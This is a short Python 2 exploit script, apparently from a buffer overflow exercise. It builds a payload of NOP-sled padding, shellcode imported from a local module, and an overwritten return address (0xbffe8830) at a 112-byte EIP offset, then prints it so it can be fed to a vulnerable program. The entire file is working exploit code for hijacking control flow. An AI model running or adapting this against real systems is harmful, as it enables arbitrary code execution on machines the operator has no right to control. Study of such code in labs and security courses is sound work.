#!/usr/bin/env python

from shellcode import shellcode
import struct

EIP_OFFSET = 112
eip = struct.pack("<I", 0xbffe8830)
padding = '\x90' * (EIP_OFFSET//2 - len(shellcode)//2) 

payload = ""
payload += padding
payload += shellcode
payload += padding
payload += eip

print payload

